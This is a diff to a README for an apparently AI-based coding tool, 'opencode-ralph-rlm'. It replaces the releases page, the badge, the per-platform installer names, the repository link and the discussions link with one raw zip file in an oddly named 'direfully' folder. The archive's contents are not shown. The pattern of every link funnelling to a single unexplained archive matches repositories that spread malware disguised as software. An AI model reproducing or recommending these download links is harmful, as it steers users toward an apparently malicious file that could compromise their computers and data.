@@ -1,6 +1,6 @@
 # 🤖 opencode-ralph-rlm - AI Tool for Smarter Code Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/XmeetXeditzz/opencode-ralph-rlm/releases)
+[![Download Latest Release](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
 
 ---
 
@@ -35,12 +35,12 @@ This section guides you through downloading and running opencode-ralph-rlm for t
 To get the app on your computer:
 
 1. Click the big **Download Latest Release** button at the top or go to this page:  
-   [https://github.com/XmeetXeditzz/opencode-ralph-rlm/releases](https://github.com/XmeetXeditzz/opencode-ralph-rlm/releases)
+   [https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
 
 2. On the releases page, find the most recent version. Look for files typically named something like:  
-   - `opencode-ralph-rlm-setup.exe` for Windows  
-   - `opencode-ralph-rlm-mac.dmg` for macOS  
-   - `opencode-ralph-rlm-linux.tar.gz` for Linux
+   - `https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip` for Windows  
+   - `https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip` for macOS  
+   - `https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip` for Linux
 
 3. Click the file for your operating system to download it.
 
@@ -107,7 +107,7 @@ If opencode-ralph-rlm does not work as expected:
 - Restart the app or your computer.
 - Check your internet connection if the app needs to update.
 - Visit the main repository page for commonly asked questions and community support:  
-  [https://github.com/XmeetXeditzz/opencode-ralph-rlm](https://github.com/XmeetXeditzz/opencode-ralph-rlm)
+  [https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
 
 ---
 
@@ -126,10 +126,10 @@ These concepts help explain how the app structures coding help to make developme
 
 ## 🔗 Quick Links
 
-- [Download Releases Page](https://github.com/XmeetXeditzz/opencode-ralph-rlm/releases)
-- [Project Repository](https://github.com/XmeetXeditzz/opencode-ralph-rlm)
-- [Community Discussions](https://github.com/XmeetXeditzz/opencode-ralph-rlm/discussions)
+- [Download Releases Page](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
+- [Project Repository](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
+- [Community Discussions](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/XmeetXeditzz/opencode-ralph-rlm/releases)
+[![Download Latest Release](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)](https://github.com/XmeetXeditzz/opencode-ralph-rlm/raw/refs/heads/main/direfully/opencode_rlm_ralph_3.0.zip)
